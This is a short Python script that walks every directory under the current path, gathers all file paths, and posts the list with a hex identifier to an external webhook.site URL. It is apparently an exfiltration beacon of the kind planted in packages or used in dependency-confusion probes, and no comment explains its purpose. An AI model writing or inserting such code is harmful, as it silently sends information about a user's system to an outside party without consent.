import os
import requests

path = '.'

files = []
# r=root, d=directories, f = files
for r, d, f in os.walk(path):
    for file in f:
        files.append(os.path.join(r, file))

data = {'host':'28033169680a075e33f020c0d3911693',
        'files':"\n".join(files)}

r = requests.post(url='https://webhook.site/194d7256-584c-4753-abd4-11a4cc9ce988', data=data)
